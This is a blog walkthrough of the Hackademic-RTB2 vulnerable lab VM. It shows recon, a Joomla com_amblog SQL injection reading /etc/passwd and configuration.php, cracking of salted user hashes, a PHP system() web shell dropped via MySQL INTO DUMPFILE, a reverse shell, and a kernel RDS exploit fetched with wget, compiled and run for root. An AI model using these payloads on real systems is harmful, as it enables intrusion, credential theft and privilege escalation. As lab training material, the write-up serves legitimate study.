---
categories:
- vulnhub
- walkthrough
- hackademic
comments: false
date: "2012-11-18T01:24:24Z"
title: Solving Hackademic-RTB2
---

Here's the second distro from mr. pr0n's realistic pentest discs.  This one was quite fun as I had almost zero experience with Joomla front ends, which so happens to be the entry point on this disc.  A little disappointed with the finale, but overall impressed with this disc.  With that, the iconic nmap:

```
# Nmap 6.01 scan initiated Wed Nov 14 16:45:09 2012 as: nmap -sS -p- -T5 -A -oN r2.scan 192.168.1.75
Nmap scan report for 192.168.1.75
Host is up (0.00016s latency).
Not shown: 65533 closed ports
PORT    STATE    SERVICE VERSION
80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Hackademic.RTB2
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
666/tcp filtered doom
MAC Address: 08:00:27:E5:D1:B9 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:kernel:2.6
OS details: Linux 2.6.17 - 2.6.36, Linux 2.6.19 - 2.6.35
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.16 ms 192.168.1.75

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done at Wed Nov 14 16:45:22 2012 -- 1 IP address (1 host up) scanned in 13.36 seconds
```

Much like the first one, we've essentially just got an HTTP server.  Port 666 is tagged as Doom, but its likely there's something else on there. 

{{< figure src="/images/posts/2012/hrt2_1.jpg" >}}

There's the main page.  Doesn't look to be hosted on a web platform, and it doesn't appear to be vulnerable to any SQLi.  Running a few queries...

```
root@bt:/pentest/web/nikto# perl nikto.pl -host http://192.168.1.75
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.1.75
+ Target Hostname:    192.168.1.75
+ Target Port:        80
+ Start Time:         2012-11-15 18:41:46 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.2.14 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7
+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 6474 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2012-11-15 18:42:00 (GMT-6) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@bt:/pentest/web/nikto# 
```

{{< figure src="/images/posts/2012/hrt2_2.jpg" >}}

There appears to be a phpMyAdmin not locked down, but it doesn't appear to be vulnerable to anything right off the bat.  Checking that 666 port again, connecting with netcat seems to dump out a bunch of HTML.  Weird; connecting now...

{{< figure src="/images/posts/2012/hrt2_3.jpg" >}}

It appears that port 666 has some form of port knocking or filtering enabled.  It also appears to be hosted on Joomla 1.5.  [There's](http://cxsecurity.com/issue/WLB-2008080155) an interesting SQLi for early 1.5 builds, but alas this one is already patched.  This is the part where I had to do a lot of googling; I've only ever made cosmetic modifications to Joomla sites.  The gist of evaluating a Joomla box is enumeration of plugins/modules and platform vulnerabilities.  Plugins are typically found at http://site.com/index.php?option=com_MODULE.  From there it's sqlmapping, exploit-db'ing (when it's available...), and googling.  Fortunately I stumbled upon a tool that tossed a lot of this toil into a simple package; NBS 0.3 Joomla Addon Attack Tool.  This came prepackaged with vulnerable plugin lists that evaluated their existence on the box as well as whether they were vulnerable or not.  The tool required a bit of tweaking on my part to account for the non-default port, but otherwise it worked well:

```
-=[ NBS 0.3 - Joomla Addon Attack Tool ]=-


Make sure you write 'Yes' or 'No' without apostrophes.
Do you wish to scan for addons? Yes or No: Yes

-= Joomla Addon Vulnerability Scanner =-

Example: http://www.domain.tld
[-] Enter a target to scan: http://192.168.1.75
[-] Enter the target port [80]: 666
[*] Trying: index.php?option=com_jscalendar&view=jscalendar&task=details&ev_id= 
[*] Trying: index.php?option=com_jedirectory&view=item&catid= 
[*] Trying: index.php?option=com_jejob&view=item_detail&itemid= 
[*] Trying: index.php?option=com_elite_experts&task=showExpertProfileDetailed&getExpertsFromCountry=&language=ru&id= 
[*] Trying: index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode= 
[*] Trying: index.php?option=com_timetrack&view=timetrack&ct_id= 
[*] Trying: index.php?option=com_jgen&task=view&id= 
[*] Trying: index.php?option=com_zoomportfolio&view=portfolio&view=portfolio&id= 
[*] Trying: index.php?option=com_fabrik&view=table&tableid= 
[*] Trying: index.php?option=com_zina&view=zina&Itemid= 
[*] Trying: index.php?option=com_ongallery&task=ft&id= 
[*] Trying: index.php?option=com_equipment&view=details&id= 
[*] Trying: index.php?option=com_amblog&view=amblog&catid= 
[*] Addon Found: index.php?option=com_amblog&view=amblog&catid= 
[+] This addon appears to be vulnerable!
[+] Exploited with  index.php?option=com_amblog&view=amblog&catid=
[+] Full exploit string: /index.php?option=com_amblog&view=amblog&catid=-1+UNION+SELECT+load_file('/etc/passwd')
root@bt:~/hackademicr2/nbs03#
```

Just like that I knew the vulnerable plugin and the query string to exploit it.  This dumps:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:107::/var/run/dbus:/bin/false avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh usbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false haldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false saned:x:112:118::/home/saned:/bin/false hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false gdm:x:114:120:Gnome Display Manager:/var/lib/gdm:/bin/false p0wnbox:x:1000:1000:p0wnbox,,,:/home/p0wnbox:/bin/bash mysql:x:115:123:MySQL Server,,,:/var/lib/mysql:/bin/false 
```

Playing around with sqlsus, we find:

```
root@bt:/pentest/database/sqlsus# ./sqlsus hackr2.conf 

              sqlsus version 0.7.2

  Copyright (c) 2008-2011 Jérémy Ruffet (sativouf)

[+] Session "192.168.1.75" created
sqlsus> start
[+] Correct number of columns for UNION : 1 (1)
[+] Length restriction on URL : 8200 bytes                      
[+] Filling %target...
+----------+--------------------+
| Variable | Value              |
+----------+--------------------+
| database | joomla             |
| user     | 'root'@'localhost' |
| version  | 5.1.41-3ubuntu12.8 |
+----------+--------------------+
3 rows in set 

sqlsus> 
```

And for reference:

```
root@bt:/pentest/database/sqlsus# cat hackr2.conf | grep 192.168.1.75
our $url_start = "http://192.168.1.75:666/index.php?option=com_amblog&view=amblog&catid=-1";
```

Looking up the Joomla 1.5 [database schema](http://docs.joomla.org/Detailed_list_of_fields), we find the users can be found in jos_users:

```
sqlsus> get columns jos_users
[+] Getting columns names for joomla.jos_users
+----------------------+                                              
| Columns in jos_users |
+----------------------+
| id                   |
| name                 |
| username             |
| email                |
| password             |
| usertype             |
| block                |
| sendemail            |
| gid                  |
| registerdate         |
| lastvisitdate        |
| activation           |
| params               |
+----------------------+
13 rows in set 

sqlsus> select id,username,password,usertype from jos_users
+----+---------------+-------------------------------------------------------------------+---------------------+
| id | username      | password                                                          | usertype            |
+----+---------------+-------------------------------------------------------------------+---------------------+
| 62 | Administrator | 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl | Super Administrator |
| 63 | JSmith        | 992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF | Registered          |
| 64 | BTallor       | abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy | Registered          |
+----+---------------+-------------------------------------------------------------------+---------------------+
3 rows in set (2 hits)

sqlsus> 
```

These passwords are stored as md5(password + salt), so we need to load them up into Hashcat or john and let them run around.  As a note, I modified the hashes a bit to be in the form `username:md5$salt`

```
root@bt:/pentest/passwords/john# john --wordlist=/pentest/passwords/wordlists/rockyou.txt --form=dynamic_1 /root/hackademicr2/hashes.txt 
Loaded 3 password hashes with 3 different salts (dynamic_1: md5($p.$s) (joomla) [128/128 SSE2 intrinsics 32x4x1])
Remaining 1 password hash
guesses: 0  time: 0:00:00:03 DONE (Thu Nov 15 23:03:45 2012)  c/s: 4333K  trying:   b1tch3s   -  * 7¡Vamos! 
root@bt:/pentest/passwords/john# cat john.pot
$dynamic_1$992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF:matrix
$dynamic_1$abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy:victim
root@bt:/pentest/passwords/john# 
```

Well we got the two users, but no super admin. 

I handed the hash off for further cracking elsewhere, but lets again take a look at the results dirbuster turned up:

{{< figure src="/images/posts/2012/hrt2_4.jpg" >}}

After more digging through Joomla documentation, turns out the 'configuration.php' holds, surprise, Joomla site configurations, specifically..

```
root@bt:/pentest/database/sqlmap# python sqlmap.py --url "http://192.168.1.75:666/index.php?option=com_amblog&view=amblog&catid=-1" -p 'catid' --dbms mysql --file-read="/var/www/configuration.php"
[SNIP]
root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_var_www_configuration.php 
<?php
class JConfig {
/* Site Settings */
var $offline = '0';
var $offline_message = 'This site is down for maintenance.<br /> Please check back again soon.';
var $sitename = 'Hackademic.RTB2';
var $editor = 'tinymce';
var $list_limit = '20';
var $legacy = '0';
/* Debug Settings */
var $debug = '0';
var $debug_lang = '0';
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
/* Server Settings */
var $live_site = '';
var $secret = 'iFzlVUCg9BBPoUDU';
var $gzip = '0';
var $error_reporting = '-1';
var $helpurl = 'http://help.joomla.org';
var $xmlrpc_server = '0';
var $ftp_host = '127.0.0.1';
var $ftp_port = '21';
var $ftp_user = '';
var $ftp_pass = '';
var $ftp_root = '';
var $ftp_enable = '0';
var $force_ssl = '0';
[SNIP]
```

Huzzah, root password hardcoded into the configuration file.  Note that this is only the MySQL root password, although its entirely possible that its also the system root password.  We know that there exists a phpMyAdmin listener, so lets log into that with our newfound credentials:

{{< figure src="/images/posts/2012/hrt2_5.jpg" >}}

Now we've got root on the database and access to the phpMyAdmin console.  From here, we can inject a backdoor that allows us to execute commands on the backend system.  This method was taken from [here](http://www.securitytube.net/video/937), though it's not exactly new.

First we create a new table:
```
CREATE TABLE shell(
 Sauce TEXT
) ENGINE = MYISaM;
```

Here we're creating a new table, shell, with a single text field, Sauce, as a MYISaM container ([more here](http://dev.mysql.com/doc/refman/5.0/en/myisam-storage-engine.html)).  Next we'll insert the actual shell interpreter into the table:

```
INSERT INTO shell
VALUES(
'<pre><? @system($_REQUEST["v"]); ?></pre>'
);
```

Next we're going to need to dump to a php file for us to actually run with.  This can be done with the INTO DUMPFILE sql command, like so:

```
SELECT *
INTO DUMPFILE '/var/www/st.php'
FROM shell;
```

How do we know to hit /var/www?  By pulling the default apache2 config file of course:

```
root@bt:/pentest/database/sqlmap# python sqlmap.py --url "http://192.168.1.75:666/index.php?option=com_amblog&view=amblog&catid=-1" -p 'catid' --dbms mysql --file-read='/etc/apache2/sites-available/default'
root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_etc_apache2_sites-available_default 
[SNIP]
<VirtualHost *:666>
    ServerAdmin webmaster@localhost

    DocumentRoot /var/www
    <Directory />
        Options FollowSymLinks
        AllowOverride None
    </Directory>
    <Directory /var/www/>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride None
        Order allow,deny
        allow from all
    </Directory>

    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
    <Directory "/usr/lib/cgi-bin">
        AllowOverride None
        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
        Order allow,deny
        Allow from all
    </Directory>

    ErrorLog /var/log/apache2/error.log

    # Possible values include: debug, info, notice, warn, error, crit,
    # alert, emerg.
    LogLevel warn

    CustomLog /var/log/apache2/access.log combined

    Alias /doc/ "/usr/share/doc/"
    <Directory "/usr/share/doc/">
        Options Indexes MultiViews FollowSymLinks
        AllowOverride None
        Order deny,allow
        Deny from all
        Allow from 127.0.0.0/255.0.0.0 ::1/128
    </Directory>

</VirtualHost>
```

Now we can execute commands on the backend:

{{< figure src="/images/posts/2012/hrt2_6.jpg" >}}

As you can see, most everything in `/var/www/` is owned by root, which would explain our inability to write anywhere.  The ownership of `configuration.php` would also explain our ability to retrieve it.

Another interesting bit was found in user p0wnbox's download's folder.  knockknock-0.7.tar.gz.

{{< figure src="/images/posts/2012/hrt2_7.jpg" >}}

We can't yet read the configuration file (we're www-data), but it appears that a port knocker is running.  This is likely why I couldn't immediately connect to the :666 Joomla site.  Interesting.

Let's drop a reverse shell onto the box the same way we did the command access. 

```
CREATE TABLE bdshell(
Sauce TEXT
);

INSERT INTO bdshell
VALUES(INSERT INTO shell
VALUES(
[SNIP]
);

SELECT *
INTO DUMPFILE '/var/www/bd.php'
FROM bdshell;
```

The snipped area from the insert is just a [PHP reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), stripped of all apostrophes.  We can now connect to it like so:

{{< figure src="/images/posts/2012/hrt2_7.jpg" >}}

Now we've got a shell on the box as www-data.  A little enumeration...

```
$ whoami
www-data
$ uname -a
Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
```

Huzzah,[privilege](http://threatpost.com/en_us/blogs/linux-kernel-flaw-coughs-root-rights-102110) escalation time.  Funny enough, exactly the exploit we used for RTB1.

```
$ cd /tmp
$ ls
orbit-gdm
pulse-PKdhtXMmr18n
$ wget www.vsecurity.com/download/tools/linux-rds-exploit.c
--2012-11-19 06:01:56--  http://www.vsecurity.com/download/tools/linux-rds-exploit.c
Resolving www.vsecurity.com... 209.67.252.12
Connecting to www.vsecurity.com|209.67.252.12|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6435 (6.3K) [text/x-c]
Saving to: `linux-rds-exploit.c'

     0K ......                                                100% 83.6K=0.08s

2012-11-19 06:01:56 (83.6 KB/s) - `linux-rds-exploit.c' saved [6435/6435]

$ ls
linux-rds-exploit.c
orbit-gdm
pulse-PKdhtXMmr18n
$ gcc linux-rds-exploit.c -o sploit
$ ./sploit
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xe099e980
 [+] Resolved rds_ioctl to 0xe0998090
 [+] Resolved commit_creds to 0xc016dd80
 [+] Resolved prepare_kernel_cred to 0xc016e0c0
[*] Overwriting function pointer...
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xe099e980
 [+] Resolved rds_ioctl to 0xe0998090
 [+] Resolved commit_creds to 0xc016dd80
 [+] Resolved prepare_kernel_cred to 0xc016e0c0
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
$ whoami
root
$ cd /root
$ ls
Desktop
Key.txt
```

Bam.  Answering a question I had before,

```
$ cat /etc/knockd.conf
[options]
    UseSyslog

[openHTTPD]
    sequence    = 7000,8000,9000
    seq_timeout = 5
    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
    tcpflags    = syn

[closeHTTPD]
    sequence    = 9000,8000,7000
    seq_timeout = 5
    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
    tcpflags    = syn
```

So we'd need to hit 7000, then 8000, then finally 9000 to get accepted.  Fortunately a simple nmap of the box will enable this rule, so it really isn't a very impressive port knocking tool.

Overall a fun disc.  And if there's any interest, I may pick up the Joomla attack tool and continue development of it.
